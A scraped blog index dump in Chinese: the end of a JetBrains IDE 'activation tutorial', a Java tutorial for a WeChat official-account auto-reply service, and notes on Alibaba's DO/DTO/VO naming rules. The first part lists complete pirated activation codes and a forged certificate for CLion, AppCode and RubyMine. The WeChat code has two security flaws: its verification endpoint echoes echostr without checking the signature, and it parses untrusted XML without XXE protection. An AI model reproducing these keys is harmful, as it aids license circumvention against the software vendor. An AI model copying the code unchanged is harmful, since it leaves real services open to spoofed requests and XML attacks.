QDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD # CLion 专用 1CFUC0974F2-eyJsaWNlbnNlSWQiOiJDRlVDMDk3NEYyIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkNMIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDotMjA0MTkyNDM5OCIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-f1foDndTa2abGqyTmiIMxYSRjoC16NxuD7QhoiOm0bzrHbqIuAXw7zsWC3U9RjqgWi/bj/8fjDpjywAFktScyATpClNXMzoR/nPJaY+J0iU+0ivubS9VERrIYL8O6WOT8PvNoqcdJ+MIK6jKY519y3VcUAd0N47ZKkpmzAOd9moR+j5ma3U8yuJno0oNtsAES7Lp3tzdMlhD7yn105jafY65bRPD8ezoc1c0GkFfsZ/1P3XPxoWeiS70wCSG32xNmcWygCROs3mnlDoamIv+K76G+jLlrR9csS/+vxWYaThfLKIvpwCDUX7xzdnXx8raXkr7c78ZshsNUQZuOgE8ww==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD # AppCode 专用 1VKZAU5B43Y-eyJsaWNlbnNlSWQiOiJWS1pBVTVCNDNZIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkFDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDo4MjMzNzExNjIiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-RrHOvDeSwoPjgraFAh3zGXDfoJ1hXOrZJroE/sKj/96CimH7YlD0An0lUEGvSEsovDprHWDZ4q2Wq11vukassv+avD1JHuurWhjp1mpIOvOntp2VHbBV9+iUxsr5ET+zJaIl0WiaRd6n75LeU4ZhxT4y6Da7cLbrqEawH+zjUuHzs60mUaqZ/5+j3qfVlwnx+iwPPu3dFtXWvADmcV/nb2jwnrJcLx9HMGVbS3yrgNoXhqXI+YRsYdNwYXbF7yVseGoxjKHQDBWTd3dAjWES/iC0s8xzLD7VXGkd3gIDJ0cc8cgzmCUr3E/QABzU1CdpqY0hyCedCvb9IOwfmTH+ug==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD # RubyMine 专用 1EZK4R5UGRP-eyJsaWNlbnNlSWQiOiJFWks0UjVVR1JQIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBSQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUk0iLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDoxOTE2MTQ0NDI2IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-Bc16m/sJ8qqPmC6hBp93iF6Y3vU9CgV5PhPpWDM3p5qEu3oM/BnP3TuTK4uxuaXo16JJF5N0RhV1n4Od7mq83La246o9e2tzTBEwniF19U3zUgOHk9arYIluefGJODHrY07uYfFJzF+i5XXZ7fVOVz1IjWtcU5Mdet/48gh2RVMRPvIi5JHZi1dRawzBKUwTzOeBGvs2GRSqWphxxc5uUqmOhQiIcNK3IBcZS8gANY0XaFmF6gkglNl7g1fPP9nZ79MWWlvDuqlXmVMCiS2OFiMNfAsJ8fjIWiY32r3PlnV/ES356fwYnVDw9ATvRZL05VaRKrLSfKuq8E/ewiRGxA==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/24/%E3%80%90IDE%E3%80%91Jet%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"},{"title":"Java开发公众号自动回复功能","text":"# 本文最先发表于我的个人博客 ，CSDN 为同步发布，如有需要，请访问 Brath 的个人博客 获取更多内容 # 背景 最近准备搭建自己的博客系统，有些软件或资料的下载链接放在网盘中，为了方便下载，同时可以将用户导流到公众号上，因此准备用 Java 实现微信公众号业务支持公众号自动回复的功能 # 准备工作 微信公众号业务支持公众号 首先当然是需要注册一个微信公众号业务支持公众号，具体步骤就不在这里赘述了，注册地址：微信公众号业务支持公众平台 注册完毕后需要完成认证操作 # 代码 依赖引入，主要为 xml 相关依赖， 因为微信公众号业务支持公众号采用的 xml 消息格式进行交互 1234567891011&lt;dependency&gt; &lt;groupId&gt;dom4j&lt;/groupId&gt; &lt;artifactId&gt;dom4j&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.19&lt;/version&gt;&lt;/dependency&gt;12345678910 自动回复内容一共需要两个接口（两个接口路由完全一致，一个为 GET 请求，一个为 POST 请求） 微信公众号业务支持公众号认证接口 此接口用于微信公众号业务支持公众号后台服务器认证使用，GET 请求 12345678910111213141516171819202122232425/** * 微信公众号业务支持校验 * * @param signature * @param timestamp * @param nonce * @param echostr * @param response */@GetMapping(&quot;callback&quot;)public void callback(String signature, String timestamp, String nonce, String echostr, HttpServletResponse response) { PrintWriter out = null; log.info(&quot;微信公众号业务支持校验消息，signature:{}，timestamp:{}，nonce:{}，echostr:{}&quot;, signature, timestamp, nonce, echostr); List&lt;WechatConfigPO&gt; configPOList = wechatConfigDao.selectAll(); try { out = response.getWriter(); out.write(echostr); } catch (Throwable e) { log.error(&quot;微信公众号业务支持校验失败&quot;, e); } finally { if (out != null) { out.close(); } }} 消息接收接口 此接口用于接收公众号消息回调，POST 请求 123456789101112131415161718192021222324252627/** * 微信公众号业务支持消息回调 * * @param request * @param response */@PostMapping(&quot;callback&quot;)public void callback(HttpServletRequest request, HttpServletResponse response) { PrintWriter out = null; try { String respMessage = wechatService.callback(request); if (StringUtils.isBlank(respMessage)) { log.info(&quot;不回复消息&quot;); return; } response.setCharacterEncoding(&quot;UTF-8&quot;); out = response.getWriter(); out.write(respMessage); } catch (Throwable e) { log.error(&quot;微信公众号业务支持发送消息失败&quot;, e); } finally { if (out != null) { out.close(); } }} 消息回复 service 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * @author Brath * @date 2023/2/23 * @desc 微信公众号业务支持 */@Slf4j@Servicepublic class WechatService { @Autowired private TextReplyService textReplyService; /** * 微信公众号业务支持回复 * * @param request * @return * @throws UnsupportedEncodingException */ public String callback(HttpServletRequest request) throws UnsupportedEncodingException { request.setCharacterEncoding(&quot;UTF-8&quot;); try { Map&lt;String, String&gt; requestMap = WechatMessageUtils.parseXml(request); log.info(&quot;微信公众号业务支持接收到消息:{}&quot;, GsonUtils.toJson(requestMap)); // 消息类型 String msgType = requestMap.get(&quot;MsgType&quot;); // 处理其他消息，暂时不做回复 switch (msgType) { case WechatMsgTypeConstant.MESSAGE_TYPE_TEXT: // 文本消息处理 return textReplyService.reply(requestMap); default: return textReplyService.reply(requestMap); } } catch (Throwable e) { log.error(&quot;回复消息错误&quot;, e); } // 不做回复 return null; }} 文本回复 service 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * @author Brath * @date 2022/5/18 9:57 * @desc 文本回复 */@Servicepublic class TextReplyService { private static final String FROM_USER_NAME = &quot;FromUserName&quot;; private static final String TO_USER_NAME = &quot;ToUserName&quot;; private static final String CONTENT = &quot;Content&quot;; @Autowired private WechatKeywordDao wechatKeywordDao; @Autowired private WechatMsgRecordDao wechatMsgRecordDao; /** * 自动回复文本内容 * * @param requestMap * @return */ public String reply(Map&lt;String, String&gt; requestMap) { String wechatId = requestMap.get(FROM_USER_NAME); String gongzhonghaoId = requestMap.get(TO_USER_NAME); TextMessage textMessage = WechatMessageUtils.getDefaultTextMessage(wechatId, gongzhonghaoId); String content = requestMap.get(CONTENT); if (content == null) { textMessage.setContent(WechatConstants.DEFAULT_MSG); } else { Example example = new Example(WechatKeywordPO.class); example.createCriteria().andEqualTo(&quot;wechatId&quot;, gongzhonghaoId).andEqualTo(&quot;keyword&quot;, content); List&lt;WechatKeywordPO&gt; keywordPOList = wechatKeywordDao.selectByExample(example); if (CollectionUtils.isEmpty(keywordPOList)) { textMessage.setContent(WechatConstants.DEFAULT_MSG); } else { textMessage.setContent(keywordPOList.get(0).getReplyContent()); } } // 记录消息记录 wechatMsgRecordDao.insertSelective(WechatMsgRecordPO.builder() .fromUser(wechatId) .wechatId(gongzhonghaoId) .content(content) .replyContent(textMessage.getContent()) .build() ); return WechatMessageUtils.textMessageToXml(textMessage); }} 文本消息 model 123456789101112131415/** * @author Brath * @date 2021/11/26 22:21 * @description 文本消息 */@Datapublic class TextMessage extends BaseMessage { /** * 回复的消息内容 */ private String Content;}1234567891011121314 基础消息 model 1234567891011121314151617181920212223242526272829303132/** * @author Brath * @date 2021/11/26 22:20 * @description 基础消息响应 */@Datapublic class BaseMessage { /** * 接收方帐号（收到的OpenID） */ private String ToUserName; /** * 开发者微信公众号业务支持号 */ private String FromUserName; /** * 消息创建时间 （整型） */ private long CreateTime; /** * 消息类型 */ private String MsgType; /** * 位0x0001被标志时，星标刚收到的消息 */ private int FuncFlag;} 消息工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * @author Brath * @date 2022/5/18 7:55 * @desc 微信公众号业务支持消息 */public class WechatMessageUtils { /** * 解析微信公众号业务支持发来的请求（XML） * * @param request * @return * @throws Exception */ public static Map&lt;String, String&gt; parseXml(HttpServletRequest request) throws Exception { // 将解析结果存储在HashMap中 Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); // 从request中取得输入流 InputStream inputStream = request.getInputStream(); try { // 读取输入流 SAXReader reader = new SAXReader(); Document document = reader.read(inputStream); // 得到xml根元素 Element root = document.getRootElement(); // 得到根元素的所有子节点 List&lt;Element&gt; elementList = root.elements(); // 遍历所有子节点 for (Element e : elementList) { map.put(e.getName(), e.getText()); } } finally { // 释放资源 if (inputStream != null) { inputStream.close(); } } return map; } /** * 文本消息对象转换成xml * * @param textMessage 文本消息对象 * @return xml */ public static String textMessageToXml(TextMessage textMessage) { XSTREAM.alias(&quot;xml&quot;, textMessage.getClass()); return XSTREAM.toXML(textMessage); } /** * 音乐消息对象转换成xml * * @param musicMessage 音乐消息对象 * @return xml */ public static String musicMessageToXml(MusicMessage musicMessage) { XSTREAM.alias(&quot;xml&quot;, musicMessage.getClass()); return XSTREAM.toXML(musicMessage); } /** * 图文消息对象转换成xml * * @param newsMessage 图文消息对象 * @return xml */ public static String newsMessageToXml(NewsMessage newsMessage) { XSTREAM.alias(&quot;xml&quot;, newsMessage.getClass()); XSTREAM.alias(&quot;item&quot;, Article.class); return XSTREAM.toXML(newsMessage); } /** * 扩展xstream，使其支持CDATA块 */ private static final XStream XSTREAM = new XStream(new XppDriver() { @Override public HierarchicalStreamWriter createWriter(Writer out) { return new PrettyPrintWriter(out) { // 对所有xml节点的转换都增加CDATA标记 final boolean cdata = true; @Override protected void writeText(QuickWriter writer, String text) { if (cdata) { writer.write(&quot;&lt;![CDATA[&quot;); writer.write(text); writer.write(&quot;]]&gt;&quot;); } else { writer.write(text); } } }; } }); /** * 获取默认文本消息 * * @param receiver 接收人 * @param officialWxid 官方微信公众号业务支持id * @return 文本消息 */ public static TextMessage getDefaultTextMessage(String receiver, String officialWxid) { TextMessage textMessage = new TextMessage(); textMessage.setToUserName(receiver); textMessage.setFromUserName(officialWxid); textMessage.setCreateTime(System.currentTimeMillis()); textMessage.setMsgType(WechatMsgTypeConstant.MESSAGE_TYPE_TEXT); textMessage.setFuncFlag(0); return textMessage; }} 消息类型枚举 12345678910111213/** * @author Brath * @date 2022/5/18 8:00 * @desc 微信公众号业务支持消息类型 */public class WechatMsgTypeConstant { /** * 文本消息 */ public static final String MESSAGE_TYPE_TEXT = &quot;text&quot;;} 其他内容为一些数据库相关操作，此处不再列出，仅为：查询关键词及其回复内容，存储消息记录 # 公众号配置 服务器配置 公众号后台 -&gt; 设置与开发 -&gt; 基本配置 -&gt; 服务器配置 填写服务器地址 填写你的服务器回调接口地址 (需要为公网地址，否则微信公众号业务支持无法调通) 生成或者自定义你的令牌 Token，后台需要配置这个 Token，一定要记住 Token 需要记住，一般在微信公众号业务支持验证接口处会校验相关信息是否是自己的公众号 验证方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 /** * @author Brath * @date 2021/11/26 21:59 * @description 微信公众号业务支持工具 */@Slf4jpublic class WechatUtils { private static final char[] HEX_DIGITS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}; public static boolean checkSignature(String signature, String timestamp, String nonce, String token) { String[] str = new String[]{token, timestamp, nonce}; //排序 Arrays.sort(str); //拼接字符串 StringBuffer buffer = new StringBuffer(); for (int i = 0; i &lt; str.length; i++) { buffer.append(str[i]); } //进 String temp = encode(buffer.toString()); //与微信公众号业务支持提供的signature进行匹对 return signature.equals(temp); } private static String getFormattedText(byte[] bytes) { int len = bytes.length; StringBuilder buf = new StringBuilder(len * 2); for (int j = 0; j &lt; len; j++) { buf.append(HEX_DIGITS[(bytes[j] &gt;&gt; 4) &amp; 0x0f]); buf.append(HEX_DIGITS[bytes[j] &amp; 0x0f]); } return buf.toString(); } public static String encode(String str) { if (str == null) { return null; } try { MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA1&quot;); messageDigest.update(str.getBytes()); return getFormattedText(messageDigest.digest()); } catch (Exception e) { throw new RuntimeException(e); } }}1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 验证公众号自动回复是否正确 可以搜索公众号 InterviewCoder) 或扫码关注公众号回复关键词《chatGPT》查看效果 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/01/02/%E3%80%90Java&%E5%85%AC%E4%BC%97%E5%8F%B7%E3%80%91Java%E5%BC%80%E5%8F%91%E5%85%AC%E4%BC%97%E5%8F%B7%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%A4%8D%E5%8A%9F%E8%83%BD/"},{"title":"阿里巴巴Java开发手册中的DO、DTO、BO、AO、VO、POJO定义","text":"分层领域模型规约： DO（ Data Object）：与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。 DTO（ Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。 BO（ Business Object）：业务对象。 由 Service 层输出的封装业务逻辑的对象。 AO（ Application Object）：应用对象。 在 Web 层与 Service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。 VO（ View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。 POJO（ Plain Ordinary Java Object）：在本手册中， POJO 专指只有 setter/getter/toString 的简单类，包括 DO/DTO/BO/VO 等。 Query：数据查询对象，各层接收上层的查询请求。 注意超过 2 个参数的查询封装，禁止使用 Map 类来传输。 领域模型命名规约： 数据对象：xxxDO，xxx 即为数据表名。 数据传输对象：xxxDTO，xxx 为业务领域相关的名称。 展示对象：xxxVO，xxx 一般为网页名称。 POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 